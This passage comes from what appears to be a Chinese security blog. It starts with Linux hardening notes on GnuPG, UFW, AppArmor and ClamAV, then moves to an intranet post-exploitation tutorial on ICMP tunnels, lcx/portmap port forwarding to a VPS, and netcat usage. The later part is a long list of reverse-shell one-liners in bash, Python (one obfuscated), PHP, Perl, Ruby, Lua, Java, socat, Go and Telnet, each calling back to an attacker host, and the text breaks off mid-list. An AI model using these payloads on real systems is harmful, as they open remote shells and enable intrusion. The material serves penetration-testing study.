检查无属主和无属组的，根据需要保存和清理(如：离职员工帐号被删除，的文件)\nfind -xdev \\(-nouser -o nogroup \\) -print    \n\n\n# 题外话：\n当t出现在其他组的x权限位置时，表示其他组具有SBIT的权限。\nSBIT（Sticky Bit）目前只针对目录有效，对于目录的作用是：当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。 \n最具有代表的就是/tmp目录，任何人都可以在/tmp内增加、修改文件（因为权限全是rwx），但仅有该文件/目录建立者与 root能够删除自己的目录或文件。\n\n```\n\n\n\n\n## <font color=red>文件加密</font>\n**网络本身不加密**\n- 通过不受信网络连接上网\n- 加密信息传输通道是首选方案(VPN)\n- 传输单个文件可使用文件级加密\n\n**很多应用也不加密**\n传输机密信息使用SSH、SCP\n\n**GnuPG**\n```bash\n# 基于文件的加密。免费开源\n# Linux默认安装\n# 斯诺登推荐\n\n\n### 使用\n\n# 1.生成密钥对(公钥，私钥)，发送方和接收方都要生成\ngpg --gen-key\n#输入name,email,密码文(保护密钥)\n#会自动进行系统信息搜集生成随机数据(越随机越安全，如果半天没响应，执行下面的命令)\n#生成随机操作 熵(促使)\nsudo find / -type f|xargs grep somerandomstring> /dev/null\n\n# 2.公钥交换:接收者先把公钥发给发送者(这里使用原始的方式)\n#2.1 接收者导出公钥文件\ngpg --export user2_name > user2_name.pub\n#2.2 公钥文件拷贝给发送者\nscp  mygpg.pub xps1@192.168.0.11:~/\n\n# 3.发送者执行\n#3.1查看当前都有哪些密钥\ngpg --list-keys\n#3.2发送者导入接收者的公钥\ngpg --import user2_name.pub\n#查看当前都有哪些密钥\ngpg --list-keys\n\n# 4.发送者开始加密文件（-recipient 是接收者的名字）\ngpg --encrypt --recipient zhangsan secert.txt    # secert.txt是要加密的文件\n\n#5.加密文件发送给接收者\n#接收者解密(使用私钥)\ngpg --output result.txt --decrypt secret.txt.gpg\n#输入私钥的加密密码串\n\n\n## 其他命令\n#查看当前都有哪些密钥\ngpg --list-keys\n#删除某人的公钥\ngpg --delete-keys zhangsan\n#删除自己的私钥\ngpg --delete-secret-keys xps\n\n## 通过密钥服务器交换密钥(指定密钥服务器， 后面16进制0x---是id值的后8位)\ngpg --keyserver certserver.pgp.com --send-key 0xAABBCCDD    # 我发送\ngpg --keyserver certserver.pgp.com --recv-key 0xAABBCCDD    # 对方获取\n#但是这种方式在国内受限\n```\n\nGnuPG大致工作流程：\n\n<img src=\"http://image.xpshuai.cn/20200519173953416_754675779.png\" />\n\n\n\n\n\n## <font color=red>防火墙</font>\n>访问控制设备\n\n**Linux内核包含`Netfilter`子系统**\n- 用于操作经过服务器的流量\n- 实现包管理\n- 用户空间管理工具`iptables`(功能强大，但是命令比较复杂)\n\n\n**Ubuntu默认的防火墙管理工具`UFW`**\n- 操作简单，默认禁用\n- 功能不全面\n- 主要用作`主机防火墙`(本身就是目标，对自己加防护)\n\n\n#### UFW\n>适合做主机防火墙，如果做网络防火墙不是很好\n\n###### 基本使用\n启用\n```bash\nsudo ufw enable    # 注意：会有提示:\"可能会导致现有的连接断开,比如22\"-->有默认策略\nsudo ufw disable\n```\n\n查看状态\n```bash\n# 规则的顺序很重要(如果中间匹配了，就不往下匹配规则了)\n\nsudo ufw status\nsudo ufw status verbose    # 详细展示: Logging: on (low)日志详细级别  Default: allow (incoming), allow (outgoing), deny (routed) -->入站的默认允许，出战的默认禁止，若作为网络防火墙(路由)默认是禁用的\nsudo ufw status numbered    # 列出序号\n```\n\n默认规则\n```bash\nsudo ufw default allow|deny|reject DIRECTION(incoming/outigoing/routed)\n\n## 两个拒绝的区别\n# deny 无视，也没有响应，不告诉发起者(推荐这个，更安全，防扫描)\n# reject 会给发起者一个响应，告诉他\n```\n\n**添加策略**\n添加规则\n```bash\nsudo ufw allow 22    # 不指定协议类型时，ctp和udp都开\nsudo ufw allow 22/tcp   # 最小化原则，只开tcp的22\nsudo ufw deny 22\n\n# ipv4的默认在上面, ipv6的默认在下面\n```\n\n设置方向(in ,out)\n```bash\nsudo ufw allow in http    # 默认设置入站规则\nsudo ufw reject out smtp\n```\n\n规则描述\n```bash\n# 规则太多了记不清\nsudo ufw reject telnet comment 'telnet is unencrypted'\n# 以后不用的规则就可以方面清理删除（安全管理意识很重要 --> 详细文档很重要，统一管理平台:工单）\n```\n\n插入规则\n```bash\n# 指定新规则的位置是2，后面的向后顺延\nsudo ufw insert 2 allow 80\n```\n\n\n删除规则\n```bash\n# 按照id序号删除\nsudo ufw delete 3\n# 按照 添加时候的规则删除\nsudo ufw delete allow http\n```\n\n定向规则\n```bash\n# 5个：源ip，目的ip，源端口(很少做限制)，目的端口，通信协议\n\n# 在2的位置插入，允许 proto协议为tcp，从1.1.1.10来的到1.1.1.9的22端口\nsudo ufw insert 2 allow proto tcp from 1.1.1.10 to any port 22 \nsudo ufw insert 2 allow proto tcp from 1.1.1.10 to 1.1.1.9 port 22 \n\nsudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to any port 22 # 使用于只允许公司内部访问\nsudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to 192.168.0.102 port 22 \n\nsudo ufw deny proto tcp from 2001:db8::/32 to any port 25   # IPv6\n    # /etc/default/ufw   启用/禁用IPv6规则(IPV6=YES)\n# 其他协议：ah, esp, gre, ipv6, igmp\n```\n\n端口名\n```bash\n# 前面 http 等是与端口对应的，不是随便起的，配置文件如下\n/etc/services\n# 可以自定义\n```\n\n规则\n```bash\nsudo ufw deny in on eth0 to 224.0.0. proto igmp    # 指定网卡（拒绝eth0入的方向使用igmp协议访问组播地址）\nsudo ufw allow in on eth0 to 224.0.0. proto gre\n\nsudo ufw allow proto tcp from any to any port 80,443,8080:8090 comment 'web'  # 一段端口范围->用冒号\n\nsudo ufw allow in on eth0 to any port 80 proto tcp\n```\n\n\n**开启路由模式**\n```bash\n# 启用路由功能\nsudo vi /etc/ufw/sysctl.conf\n    netipv4/ip_forward=1\n    net/ipv6/conf/default/forwarding=1\n    net/ipv6/conf/all/forwarding=1\n\n# \nsudo sysctl -p\nufw disable\nufw enable\n```\n\n路由模式规则\n```bash\n# 启用路由功能(转发数据包)，先添加规则再开启路由也可\n# 7个：源网卡接口，目的网卡接口，源ip，目的ip，源端口(很少做限制)，目的端口，通信协议\nsudo ufw route allow in on eth1 out on eth2  # eth1网卡in的流量， eth2出的流量\nsudo ufw route allow in on eth1 out on eth2 to 192.167.11 port 80 proto tcp\n```\n\n\n限制连接频率\n```bash\n# 尽量规避暴力破解\nufw limit ssh/tcp    # 30s超过6次就deny\n```\n\n###### 安全相关\nUFW作为网络防火墙(先开启路由转发)\n\n**IP遮盖**\n```bash\n# sudo vi /etc/default/ufw\n    DEFAULT_FORWARD_POLICY=\"ACCEPT\"\n\n# sudo vi /etc/ufw/sysctl.conf\n    net/ipv4/ip_forward=1    # 启用路由功能\n\n# sudo vi /etc/ufw/before.rules\n    *nat            # 开启nat地址转换\n    ：POSTROUTING ACCEPT [0:0]    # 接收路由转发\n    -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE    # 添加规则：制定来源内网网段，指定另一个有公网ip的的网卡然后进行地址转换并发出去\n    COMMIT    # \n```\n\n完整语法规则\n```bash\nsudo ufw route allow/reject/deny/limit insert/delete/pretend in on eth0 out on eth1 from 1.1.1.1 oport 1:65535 to 2.2.2.2 port 22 proto tcp/udp/igmp/esp/ah\n# 如果不指定规则id位置，就默认在后面依次；pretend是依次从前面添加\n```\n\n小技巧 -- 应用程序\n```bash\n# 为非标准端口的应用定义名称\n# 为每个开放端口的服务程序分别定义程序配置文件  /etc/ufw/applications.d/\n\nsudo ufw allow from 192.168.0.0/24 to any app CUPS\nsudo ufw app into CUPS\n    [<name>]\n    title=<title>\n    description=<description>\n    portd=<ports>\n    ports=12/udp|32|56,78:90/tcp    # 竖线隔开\n\n# 应用防火墙规则\nsudo ufw app update <name>\n\n# 适用情景：\n非标准业务的服务端口，一个应用同时绑定多个端口，业务描述也可以添加进去，修改也方便\n```\n\n\n###### 日志功能\n>UFW默认不记录日志，因为占用存储空间\n\n日志的价值在于：识别攻击、规则排错、诊断问题\n\n```bash\n# 全局开启日志，以及级别 / 关闭日志\nsudo ufw logging on|off|LEVEL(LOW/medium/high/full)\n\n# 存储位置：/var/log/ufw.log\n\n# 单独为每条规则添加日志\nsudo ufw allow log 22/tcp\n```\n\n\n###### 恢复默认规则\n```bash\n# 系统全新安装的状态(实在搞不清才使用，会提前备份->/etc/ufw/日期命名的文件)\nsudo ufw reset\n```\n\n\n#### Shorewall\n适合任何网络的高级防火墙\n有图形管理界面\n\n因为iptables语法有点麻烦，不想使用\n\n\n\n\n## <font color=red> AppArmor</font>\n#### 简介\n**AppArmor是一个Linux安全模块**\n- 使不安全和不受信进程在受限的约束下运行\n- 保证进程访问共享文件、行使特权、与其他进程通信\n- 针对某一个进程层面\n- 界面美观，操作较简单\n\n\n**全局强制访问控制机制(MAC)**\n- 基于LSM的额外安全功能\n- 系统调用前，内核查询AppArmor策略，确定程序是否有权执行操作\n- 不同与SELinux(过于庞大, 针对操作系统层面)，与用户无关，可用于限制超级用户权限（所有用户继承）\n- 将进程限制在有限的系统资源之上\n- 预设的控制机制，一定程度可预防未知安全漏洞（0day）\n\n\n**Ubuntu默认的安全系统**\n默认已安装并加载\n\n\n**控制策略**\n- 基于安装路径识别程序并控制\n- 策略保存于相应配置文件(profile)中\n- 集合高级静态分析和基于文件`/etc/apparmor.d`\n- 部分安装包自带配置文件\n\n\n#### 使用\n**安装额外配置文件**\n```bash\nsudo apt install apparmor-profiles apparmor-profiles-extra\n# apparmor-profiles        # 由上游社区管理维护的配置文件\n# apparmor-profiles-extra    # 由ubuntu、debian开发的配置文件\n```\n安装用户端管理工具\n```bash\nsudo apt install apparmor-utils\n```\n\n查看状态\n```bash\nsudo aa-status\n```\n\n控制模式\n```bash\n# enforcing      强制策略实施并记录被禁用请求\n# complaining    只记录被禁请求，但不强制实施禁止   -->策略调试时候用\n\n## 切换模式\naa-enforce    # 切换为强制模式\naa-complain   # 切换为包容模式\naa-disable    # 禁用指定pofile(不对这个程序做限制，不loaded)\naa-audit      # 审计模式，= enforce + 记录成功访问的请求(并不是很常见)\n```\n\n当前已经加载的配置文件\n```bash\n/sys/kernel/security/apparmor/profiles\n```\n\n配置文件命令\n- 与可执行程序结对路径相同，` / ` -> ` . `\n- 软连接将最终解析到目标程序\n\n\n默认配置文件\n安装包携带并有效（bind9, mysql ...）\n安装包携带但为空（mariadb）\n安装包无配置文件，额外包故障（samba）\n\n\n###### samba为例\n1.安装samba服务\n```bash\n# \nsudo apt install samba samba-common apparmor-profiles\nsudo aa-status\n#/etc/apparmor.d/usr.sbin.smbd     # nmbd服务也可以\n```\n2.启用强制策略\n```bash\nsudo aa-enforce /usr/sbin/smbd    # 对smbd进行策略限制\nsudo aa-status\n```\n3.重启服务\n```bash\nsudo systemctl restart smbd    # 会发现报错无法启动服务(因为配置文件有问题)\ntail /vat/log/syslog    # 查看系统日志，发现 apparmor=\"DENIED\"， 建议：从第一个DENIED开始往下看,一次修改一条\n```\n4.修正配置文件\n```bash\nsudo vi /etc/apparmor.d/usr.sbin.smbd\n    ## 这里根据日志DENIED的内容来写（每一行都有逗号）\n    /var/run/smbd rw,    # path路径项权限 根据自己的写...\n    capability net_admin,    # capability进程权限\n\n# 重新加载配置文件\nsudo apparmor_parser -r usr.sbin.smbd\n# 重新加载所有配置文件\nsudo systemctl reload apparmor.service\n# 然后重启服务，查看能不能起来，如果不能起来->继续查看日志和修改配置的步骤\nsudo systemctl restart smbd \nsudo systemctl status smbd \n。。。。。。\n```\n\n\n###### 从头开始创建新的配置文件\n不建议对所有程序都做限制，主要面向`对外/接收提供网络服务相关`的程序(apache, samba, 浏览器等等容易遭受攻击的)\n\n```bash\n # 查看进了行网络请求，但是没有apparmor配置文件对其进行保护的程序\nsudo aa-unconfined   \nsudo aa-unconfined --paranoid    # 所有关联网络端口的进程\n\n# 这里拿mtr作为例子\naa-genprof mtr    # 指定对什么程序进行配置\nmtr www.baidu.com    # 运行示例程序\n# 继续按照提示选择\n\n# \nsudo apparmor_parse -r usr.bin.mtr\nsudo aa-logpro    # 检查日志更新配置文件\n```\n\n\n\n\n\n\n## <font color=red>防病毒</font>\n<img src=\"http://image.xpshuai.cn/20200520113246789_2113511743.png\" />\n\n\n**恶意软件**\n病毒、木马、蠕虫、远控、僵尸程序、勒索、挖矿、漏洞利用\n\n通常防病毒和Linux不会出现在同一句话里，BUT！\n- 专门针对Liunx发行版的恶意软件\n- 没有100%有效的单个杀毒软件（病毒库互补）\n\n**ClamAV**: 开源免费全平台\n\n#### ClamAV\n1.安装\n```bash\nsudo apt install clamav clamav-daemon   # 如果只安装clamav，就不做自动监控；clamav-daemon 自动查杀\nsudo apt install install libclamunrar6    # 对压缩包也查杀病毒\n\n# 有桌面环境的话，可以安装客户端图形管理工具\n```\n\n2.更新病毒库\n```bash\nsudo systemctl stop clamav-freshclam\n# \nsudo freshclam    # 会报错(因为他已经自动更新了)，可以先停止掉(上面)，再手动。也可以等待他更新完\nless /var/log/clamav/freshclam.log  # 可以查看日志记录\n\n```\n\n代理\n```bash\nsudo vi /etc/clamav/freshclam.conf\n    HTTPProxyServer server_address\n    HTTPPrpxyPort port_number\n\n```\n\n\n图形化前端工具\n```bash\nclamtk\n```\n\n3.手动扫描\n```bash\n# 扫描会占用系统资源，所以选择业务不是繁忙的时间来查杀\n# 手动扫描的当前用户能扫描的位置\nclamscan /home/xps -i -r    # -r递归， -i显示\n\n# --max-filesize 限制大小(超过大小就不会扫它)， --max-scansize最大扫多少(比如一个文件我只扫多少)， --exclude-dir排除目录\nsudo clamscan --max-filesize=3999M --max-scansize=3999M --exclude-dir=/sys/* -i -r /home\n# 默认不具有杀毒能力，只是检测    \n\n# --remove    查到感染的文件，删除\n# --bell      查到感染的文件，嘟嘟嘟提醒\n# move=/tmp/VIRUS    查到感染的文件，移动到某个位置\n# copy=/tmp/VIRUS\n\n```\n\n测试\n```bash\nwget http://www.eicar.org/download/eicar.com    # 测试病毒文件,含毒，但是没破坏作用\n\nclamscan -i -r ./\n```\n\n\n4.扫描调度(定时任务) -- 防止误杀(管理员要提前做好管理备份或者实时监视)\n```bash\nat 13:00 tomorrow\n    clamscan -i -r /home/xps\n    freshclam\n    <EOF>\n    <CTRL-D>\n\n# 或者其他调度命令 crontab\n```\n","tags":["ClamAV"],"categories":["Linux"]},{"title":"内网第三章-隐藏隧道通信技术","url":"%2Fposts%2F35263%2F","content":"\n# 内网第三章-隐藏隧道通信技术\n\n\n## <font color=red>内网连通性判断  </font>\n#### 常用判断方法  \n**1.ICMP协议**\n\n```bash\nping <IP>\n```\n2.TCP协议\n```bash\nnc -zv <IP> <port>\n```\n3.HTTP协议\n```bash\ncurl ip:port\n```\n4.DNS协议\n```bash\n# 1.\nnslookup www.baidu.com vps-ip  # vps-ip是dns服务器的地址\n\n# 2.\ndig @vps-ip www.baidu.com\n```\n\n## 若流量不能直接流出\n>常见于企业办公网段上网的场景\n\n1. 查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行`ping -n 1 -a <ip>`)\n2. 查看内网中是否有主机名类似于`proxy`的机器\n3. 查看IE浏览器的直接代理\n4. 根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。\n5. 执行以下命令，利用curl工具进行确认\n\n```bash\ncurl www.baidu.com    # 不通\ncurl -x proxy-ip:port  www.baidu.com    # 通\n```\n\n\n\n## <font color=red> 网络层隧道技术</font>\n- IPv6隧道\n- ICMP隧道\n  \n#### IPv6隧道\n常见工具：`socat`,`6tunnel`,`nt6tunnel`等\n\n概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术\n\n现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中)\nNote：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包\n\n**配置隧道与自动隧道的区别：**\n只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。\n配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制\n\n\n**防御：**\n了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信\n\n\n#### ICMP隧道\n常见工具：`icmpsh`,`PingTunnel`,`icmptunnel`,`powershell icmp`等\n\n比较特殊的协议，`不用开放端口`，最常见的ICMP消息为ping命令的回复。\n将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。\n\n###### 工具\n**1.icmpsh**\n```bash\n# 不需要管理员权限\n# 简单，不存在正向反向\n# 下载地址: https://github.com/inquisb/icmpsh\n# 本机和目标都要安装\n# 安装依赖库\napt-get install python-impacket\n\n\n### 使用\n# 我机器执行\n# 先关闭本地系统的icmp应答(恢复改为0就行) -> 否则会无限刷屏\nsysctl -w net.ipv4.icmp_echo_ignore_all=1\n\n./run.sh  # 输入目标的公网ip  （此文件好像不对，用下面的py文件吧）\n# 或者\n./icmpsh_m.py IP(公网) IP(内网的公网ip)    # 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等\n\n# 目标机器执行（这里使用的win版本）\nicmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128  # 192.168.1.7我的vps\n\n# 我的vps就会接收到反弹过来的shell\n```\n\n\n**2.PingTunnel**\n```bash\n# 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/\n# 貌似可以这么安装：sudo apt install ptunnel\n# 可跨平台使用。为了避免滥用，可为隧道设置密码\n\n# 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器\n\n# 首先在两台机器都安装上此工具\n## 安装方法\n#1.安装编译\ntar -zxvf ...\ncd ...\nmake && make install\n#2.如果缺少pcap.h(数据包捕获函数库),就安装\nwget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz\ntar -zxvf ...\ncd ...\n./configure\n#3.如果yacc包错误，安装\nsudo apt-get install -y byacc\nsudo apt-get install flex bison\n#好了之后再安装一遍\n./configure\nmake && make install\n# 查看帮助信息\nman pcap\n\n\n## 使用方法\n#4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库)\n# 跳板机器(假设是已获取到的web服务器)：\nptunnel -x shuteer111\n# VPS上：\nptunnel -p <跳板_IP> -lp 1080 -da <另一新目标_IP> -dp 3389 -x shuteer111\n# 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的)\n\n#5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口\n\n```\n参数说明：\n```bash\n-x    # 指定icmp隧道连接验证密码\n-p    # 指定icmp隧道另一端机器(跳板)的ip地址\n-lp   # 指定要监听的本地tcp端口\n\n-da   # 指定要转发的机器的ip地址\n-dp   # 指定要转发的机器的tcp端口\n```\n\n\n**其他工具**\n\n\n###### 防御方法\n\n通过Wireshark进行ICMP数据包分析，如下：\n- 检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包\n- 注意那些Payload大于64bit的ICMP数据包\n- 寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包\n- 检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加\"TUNL\"标记来标识隧道 -> 这就是特征\n\n\n## <font color=red> 传输层隧道技术</font>\n传输层技术包括：TCP隧道、UDP隧道、常规端口转发等\n\n若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口\n\n#### 1.lcx端口转发\n两个版本：\n- Linux 版本：`portmap`\n- Widows版本：`lcx.exe`\n\n一个客户端一个服务端\n\n**lcx内网端口转发**\n```bash\n先传lcx到目标机器\n#在内网目标shell上: l\ncx -slave 公网ip 4444 127.0.0.1 3389  # 把目标机器的3389流量转发到指定服务器(vps)指定端口\n#vps服务器(我的)上执行：\nlcx -listen 4444 33891  # 将本地4444端口上监听的所有数据转发到本机33891端口\n\n#然后远程桌面连接本地的33891端口即可\n```\n\n**lcx本地端口映射**\n```bash\n# 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53)\n# 在目标主机执行\nlcx -tran 53 <目标ip>: 3389\n```\n\n**linux版的portmap**\n```bash\n# 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip\n\n# vps\n./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777\n# 目标内网机器\n./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666\n\n```\n\n\n#### 2.netcat\n安装\n```bash\n## Linux\n# http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download\n#1. \napt-get install netcat\n  \n# 2. \nwget ...\ntar -zxvf ...\ncd ...\n./configure\nmake\n\n## Windows\nhttps://joncraton.org/files/nc111nt.zip\nhttps://joncraton.org/files/nc111nt_safe.zip\n```\n\n参数\n```bash\n\n```\n\n**使用**\nBanner抓取\n```bash\n# banner可标识服务的版本等信息\n\n# 题外话:追踪路由\nmtr 114.114.114.114 \n\n\n## nc作为客户端：\n# 参数 -v  显示详细信息 \n# 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)\nnc -nv 1.1.1.1 110   # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）\nnc -nv 1.1.1.1 25    # smtp服务器\nnc -nv 1.1.1.1 80    # 探测80端口(都可进行交互的命令)\n\n```\n连接到远程主机\n```bash\nnc -nvv 1.1.1.1 110 \n```\n端口扫描\n```bash\n#并非擅长端口扫描, 还慢\n#参数 -z 扫描参数，只判断是否开放（默认tcp）\nnc -nvz 1.1.1.1  20-8080\n#参数 -u  扫描udp服务的端口 （不太准确）\nnc -nvzu 1.1.1.1 1-1024\n```\n\n端口监听\n```bash\nnc -l -p 999\n# 习惯\nnc -lvvp 9999\n```\n\n文件传输\n```bash\n# 一旦连接建立，数据流就会传入，接收文件\nnc -lp 333 >1.txt\n# 发送文件内容\nnc -nv 192.168.0.11 < test.txt -q 1    #参数 -q: 输出完成之后过1秒就断开\n```\n\n简易聊天\n```bash\nnc -l -p 8888\n\nnc -vn 192.168.0.11 8888\n```\n\n获取shell\n```bash\n# 参考：https://www.uedbox.com/post/54632\n# https://www.secpulse.com/archives/76223.html\n\n##### nc正向shell（正向shell -> 内网服务器之间）\n1.目标主机监听：\nnc -lvvp 4444 -e /bin/bash # linux\nnc -lvvp 4444 -e c:\\\\WINDOWS\\system32\\cmd.exe    # win\n2.本机连接目标\nnc 192.168.1.11 4444\n\n\n##### nc反向shell\n1.本机\nnc -lvvp 3333       \n2.目标机器执行\nnc 192.168.0.111 3333 -c /bin/bash    # Linux\nnc 192.168.0.111 -e c:\\\\WINDOWS\\system32\\cmd.exe    # win\n\n\n\n###### 如果目标主机没有nc，获取反向shell\n###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell\n# bash反弹shell\n/bin/bash -c bash -i >& /dev/tcp/192.168.41.13/4444 0>&1\n\n# bash反弹shell(TCP)\n目标机器： bash -i >& /dev/tcp/192.168.41.133/4444 0>&1\n攻击方： nc -lvvp 4444\n\n# bash反弹shell(UDP)\n目标机器： bash -i >& /dev/tcp/192.168.41.133/4444 0>&1\n攻击方监听： nc -u -lvp 4444\n\n\n\n\n# python反向shell\n// 方法一\n$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n \n// 方法二\n$ export RHOST=\"127.0.0.1\";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n# windows python反弹shell\nC:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n\n\n\n# php反向shell\nphp -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n\n\n# Perl反向shell\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n#\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n#NOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n \n\n\n\n# Ruby反向shell\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n#不依赖于/bin/sh的反弹shell\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n#如果目标系统运行Windows反弹shell\nruby -rsocket -e 'c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n\n\n# Lua反向shell\n#Linux\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');\"\n#Windows\nlua5.1 -e 'local host, port = \"127.0.0.1\", 4444 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n\n\n\n\n# Java反弹shell\nr = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor()\n\n\n\n# socat反弹shell\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555\n\n\n\n\n# Golang反弹shell\necho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.0.134:8080\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n\n\n\n# Telnet反弹shell\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n#获取反弹shell后，可使用python获得交互式shell\npython -c'import pty; pty.spawn(\"/bin/bash\")' python -c ''' import pty while(1):     try:         pty.spawn(\"/bin/bash\")     except :         contiune'''\n\n\n\n# 